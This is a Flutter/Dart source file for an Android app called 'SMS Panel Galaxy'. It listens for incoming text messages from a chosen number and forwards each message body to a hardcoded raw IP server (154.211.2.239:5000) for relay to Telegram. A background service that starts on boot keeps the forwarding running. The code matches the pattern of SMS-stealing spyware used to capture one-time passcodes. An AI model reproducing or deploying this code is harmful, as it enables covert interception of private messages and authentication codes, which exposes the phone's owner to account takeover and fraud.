import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:android_alarm_manager_plus/android_alarm_manager_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:sms_advanced/sms_advanced.dart' as sms_advanced;
import 'package:telephony/telephony.dart' as telephony; // استفاده از alias

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Initialize Alarm Manager
  await AndroidAlarmManager.initialize();

  // Initialize background service
  await initializeService();

  runApp(const SmsPanelApp());
}

class SmsPanelApp extends StatelessWidget {
  const SmsPanelApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      home: SmsPanelHome(),
    );
  }
}

class SmsPanelHome extends StatefulWidget {
  const SmsPanelHome({Key? key}) : super(key: key);

  @override
  SmsPanelHomeState createState() => SmsPanelHomeState();
}

class SmsPanelHomeState extends State<SmsPanelHome> {
  TextEditingController verificationController = TextEditingController();
  TextEditingController phoneController = TextEditingController();
  String? selectedSimCard;
  bool isRunning = false;
  final sms_advanced.SmsReceiver? smsReceiver = sms_advanced.SmsReceiver(); // استفاده از null safety
  final telephony.Telephony telephonyInstance = telephony.Telephony.instance; // استفاده از telephony instance

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('SMS Panel Galaxy'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          children: [
            TextField(
              controller: verificationController,
              decoration: const InputDecoration(
                labelText: 'Enter Verification Code',
              ),
            ),
            TextField(
              controller: phoneController,
              decoration: const InputDecoration(
                labelText: 'Enter Phone Number to forward SMS',
              ),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: isRunning ? null : startSmsReceiver,
              child: Text(isRunning ? 'Running...' : 'Start'),
            ),
          ],
        ),
      ),
    );
  }

  void startSmsReceiver() async {
    String verificationCode = verificationController.text;
    String phoneNumber = phoneController.text;

    bool isVerified = await verifyUser(verificationCode);

    if (isVerified) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setString('targetPhoneNumber', phoneNumber);

      FlutterBackgroundService().startService();

      // استفاده از SmsReceiver از پکیج sms_advanced
      smsReceiver?.onSmsReceived?.listen((sms_advanced.SmsMessage message) async {
        if (message.address == phoneNumber) {
          await saveSmsLocally(message.body!);
          await sendMessageToTelegram(prefs.getString('chatId')!, message.body!);
        }
      });

      setState(() {
        isRunning = true;
      });
    } else {
      if (mounted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text("Verification failed")),
        );
      }
    }
  }

  Future<bool> verifyUser(String code) async {
    var response = await http.get(Uri.parse(
        'http://154.211.2.239:5000/api/getChatId?verification_code=$code'));

    if (response.statusCode == 200) {
      var jsonResponse = json.decode(response.body);
      SharedPreferences prefs = await SharedPreferences.getInstance();
      prefs.setString('chatId', jsonResponse['chatId']);
      return true;
    } else {
      return false;
    }
  }
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      isForegroundMode: true,
      autoStartOnBoot: true,
      notificationChannelId: 'my_foreground',
      initialNotificationTitle: 'SMS Service',
      initialNotificationContent: 'Running in background...',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(
      onForeground: onStart,
      autoStart: true,
    ),
  );
}

// شروع سرویس در پس‌زمینه
void onStart(ServiceInstance service) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  String? phoneNumber = prefs.getString('targetPhoneNumber');
  String? chatId = prefs.getString('chatId');

  final sms_advanced.SmsReceiver? smsReceiver = sms_advanced.SmsReceiver(); // استفاده از null safety
  smsReceiver?.onSmsReceived?.listen((sms_advanced.SmsMessage message) async {
    if (message.address == phoneNumber) {
      await saveSmsLocally(message.body!);
      await sendMessageToTelegram(chatId!, message.body!);
    }
  });
}

Future<void> sendMessageToTelegram(String chatId, String message) async {
  var url = 'http://154.211.2.239:5000/api/sendMessage';
  var body = json.encode({
    'chat_id': chatId,
    'message': message,
  });

  await http.post(Uri.parse(url),
      headers: {"Content-Type": "application/json"}, body: body);
}

Future<void> saveSmsLocally(String sms) async {
  SharedPreferences prefs = await SharedPreferences.getInstance();
  List<String>? smsList = prefs.getStringList('smsMessages') ?? [];
  smsList.add(sms);
  prefs.setStringList('smsMessages', smsList);
}
